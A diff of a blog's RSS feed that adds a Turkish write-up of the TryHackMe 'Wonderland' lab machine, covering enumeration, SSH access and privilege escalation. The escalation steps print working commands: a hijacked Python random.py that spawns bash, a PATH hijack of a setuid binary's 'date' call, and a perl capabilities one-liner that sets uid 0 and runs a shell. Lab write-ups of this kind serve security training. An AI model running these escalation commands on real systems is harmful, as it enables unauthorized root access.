@@ -5,8 +5,152 @@
         <description>Recent content in Posts on Cyber Security Blog</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>tr</language>
-        <lastBuildDate>Wed, 07 Oct 2020 11:49:09 +0300</lastBuildDate>
+        <lastBuildDate>Thu, 08 Oct 2020 12:39:20 +0300</lastBuildDate>
         <atom:link href="https://barcode91.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>THM Wonderland Write Up</title>
+            <link>https://barcode91.github.io/posts/2020/10/thm-wonderland-write-up/</link>
+            <pubDate>Thu, 08 Oct 2020 12:39:20 +0300</pubDate>
+            
+            <guid>https://barcode91.github.io/posts/2020/10/thm-wonderland-write-up/</guid>
+            <description>Merhaba, Bu yazımda sizlere Tryhackme&amp;rsquo;de yer alan orta seviye zorluktaki Wonderland adlı makinanın çözümünden bahsedeceğim. Keyifli okumalar&amp;hellip;
+1. Keşif Aşaması Nmap ile makinenin açık portları ve portlarda çalışan servisleri tespit edilir.
+sudo nmap -sV -sC 10.10.248.80  Sistemde sadece 2 port açıktır. Web sayfasına giriş yapılır.
+Gobuster aracı ile dizin taraması yapılır. 3 adet dizin tespit edilir.
+gobuster dir -u http://10.10.248.80/ -w /usr/share/wordlists/dirb/big.txt  /img dizine girilir. Dizindeki tüm resim dosyaları indirilir.</description>
+            <content type="html"><![CDATA[<p>Merhaba, Bu yazımda sizlere Tryhackme&rsquo;de yer alan orta seviye zorluktaki <a href="https://tryhackme.com/room/wonderland">Wonderland</a> adlı makinanın çözümünden bahsedeceğim. Keyifli okumalar&hellip;</p>
+<h2 id="1-keşif-aşaması">1. Keşif Aşaması</h2>
+<p>Nmap ile makinenin açık portları ve portlarda çalışan servisleri tespit edilir.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo nmap -sV -sC 10.10.248.80
+</code></pre></div>
+    <img src="/images/thm/wonderland/nmap.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>Sistemde sadece 2 port açıktır. Web sayfasına giriş yapılır.</p>
+
+    <img src="/images/thm/wonderland/web1.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>Gobuster aracı ile dizin taraması yapılır. 3 adet dizin tespit edilir.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gobuster dir -u http://10.10.248.80/ -w /usr/share/wordlists/dirb/big.txt 
+</code></pre></div>
+    <img src="/images/thm/wonderland/gobuster1.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>/img dizine girilir. Dizindeki tüm resim dosyaları indirilir.</p>
+
+    <img src="/images/thm/wonderland/img.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />
+
+
+<p><strong>steghide</strong> aracı ile resimler içerisine gizlenmiş olan dosyalar tespit edilir. Yapılan kontrolde white_rabbit.jpg dosyası içerisinde hint.txt adlı bir dosya gizlenmiştir.</p>
+
+    <img src="/images/thm/wonderland/steg.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>Dosya içeriğine bakıldığında tavşanı takip etmemiz söyleniyor. 🐇</p>
+
+    <img src="/images/thm/wonderland/hint.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />
+
+
+<p><em><strong>/r</strong></em> dizin içeriği görüntülenir. Daha dizin içerisinde gobuster ile dizin taramasına devam edilir.</p>
+
+    <img src="/images/thm/wonderland/r.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />
+
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gobuster dir -u http://10.10.248.80/r/ -w /usr/share/wordlists/dirb/big.txt
+</code></pre></div>
+    <img src="/images/thm/wonderland/gobuster2.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />
+
+
+<p><em><strong>/r</strong></em> dizini içerisinde <em><strong>/a</strong></em> dizini tespit edilir. İpucunda olan tavşan mevzusunun ne olduğu anlaşılır.💡Tarayıcından <em><strong>http://ipadresi/r/a/b/b/i/t</strong></em> adresine istek atılır.</p>
+
+    <img src="/images/thm/wonderland/rabbit.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>Sayfa kaynak kodları incelendiğinde gizli bir bilgi tespit edilmektedir.</p>
+
+    <img src="/images/thm/wonderland/ssh.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />
+
+
+<h2 id="2-erişim-sağlanması">2. Erişim Sağlanması</h2>
+<p>Elde edilen bilgi herhangi bir login paneli tespit edilmediğinde ssh bağlantısı için kullanılır.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ssh alice@10.10.248.80
+</code></pre></div>
+    <img src="/images/thm/wonderland/ssh1.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />
+
+
+<h2 id="3-yetki-yükseltme">3. Yetki Yükseltme</h2>
+<p><code>Sudo -l</code> ile kullanıcının yetkileri kontrol edilir. Rabbit kullanıcısı yetkisi ile <em>walrus_and_the_carpenter.py</em> dosyası çalıştırılmaktadır.</p>
+
+    <img src="/images/thm/wonderland/sudo.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>walrus_and_the_carpenter.py içeriğine bakıldığında poem değişkeni içerisinde yer alan metinden rastgele belirlenen 10 satır ekrana basılmaktadır.</p>
+
+    <img src="/images/thm/wonderland/py.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>Rabbit kullanıcısına Hijacking Python Library tekniği ile geçilir. Aynı dizinde random.py adında dosya oluşturulur. İçerisine çalıştırmak istediğimiz kodlar yazılır. Uygulama çalıştığında random kütüphanesi import edilirken bizim yazdığımız kodlar import edilecektir.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> os
+os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;/bin/bash)</span>
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
+</code></pre></div><p>Rabbit kullanısının home dizine geçilerek dosyalar listelenir. Suid biti aktif olan <em><strong>teaParty</strong></em> adında bir dosya görülmektedir.</p>
+
+    <img src="/images/thm/wonderland/rabbito.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>Dosya çalıştırıldığında Hatter&rsquo;ın partiye geleceği bilgisi ekrana basılmakta ve uygulama kullanıcıdan girdi beklemektedir. Herhangi bir tuşa basınca ekrana Segmentation Fault yazdırılmaktadır.</p>
+<pre><code class="language-terminal" data-lang="terminal">rabbit@wonderland:/home/rabbit$ ./teaParty
+Welcome to the tea party!
+The Mad Hatter will be here soon.
+Probably by Wed, 07 Oct 2020 20:06:29 +0000
+Ask very nicely, and I will give you some tea while you wait for him
+ls
+Segmentation fault (core dumped)
+</code></pre><p>Binary ayrıntılı incelenmek üzere locale indirilir. Daha sonra Ghidra ile analiz edilir.</p>
+
+    <img src="/images/thm/wonderland/ghidra.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>Setuid(0x3eb) ve setguid(0x3eb) ile uid değeri Hatter (1003) kullanıcısına set edilir. Burada dikkat çeken echo ve date komutlarının çalıştırılmasıdır. Echo komutu için tam yol belirtilirken, date komutu için path belirtilmemiştir. Date komutu PATH değişkeninde tanımalanan dizinlerde sıra ile aranmaktadır.</p>
+<ol>
+<li><em>Date dosyası oluşturulur.</em></li>
+<li><em>Date dosya dizini PATH değişkenine eklenir.</em></li>
+</ol>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">rabbit@wonderland:/home/rabbit$ echo /bin/bash &gt; date
+rabbit@wonderland:/home/rabbit$ chmod <span style="color:#ae81ff">777</span> date
+rabbit@wonderland:/home/rabbit$ export PATH<span style="color:#f92672">=</span>/home/rabbit/:$PATH
+</code></pre></div><p>Dosya çalıştırılarak <em><strong>hatter</strong></em> kullanıcısına geçiş yapılır. Hatter dizini içeriğine göz atılır.</p>
+
+    <img src="/images/thm/wonderland/matter.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>Password.txt dosyasında yer alan parola bilgisi ile hatter kullanıcısına geçiş yapılır.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ssh hatter@localhost
+</code></pre></div><p>Hatter kullanıcısı yetkileri ile sistem hakkında bilgi toplamak için LinEnum betiği çalıştırılır. Betik çıktısında capability yetkileri olan dosyalar dikkat çekmektedir.</p>
+
+    <img src="/images/thm/wonderland/cap.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>Perl uygulamasının <em>setuid</em> ile yetkilerinin yükseltilerek kernele sistem çağırısı yapılabilceği tespit edilmektedir. <em><strong>uid değeri 0 (root)</strong></em> set edilir ve /bin/bash uygulaması çalıştırılır.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">/usr/bin/perl -e <span style="color:#e6db74">&#39;use POSIX qw(setuid); POSIX::setuid(0); exec &#34;/bin/sh&#34;;&#39;</span>
+</code></pre></div>
+    <img src="/images/thm/wonderland/priv.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />
+
+
+<p><em>/root</em> dizini içerisinde yer alan user.txt dosyası,</p>
+
+    <img src="/images/thm/wonderland/userflag.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>ve <em>/home/alice</em> dizininde yer alan root.txt dosyaları okunarak makina çözümlemesi tamamlanır.</p>
+
+    <img src="/images/thm/wonderland/rootflag.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />
+
+
+]]></content>
+        </item>
         
         <item>
             <title>THM Blog Write Up</title>
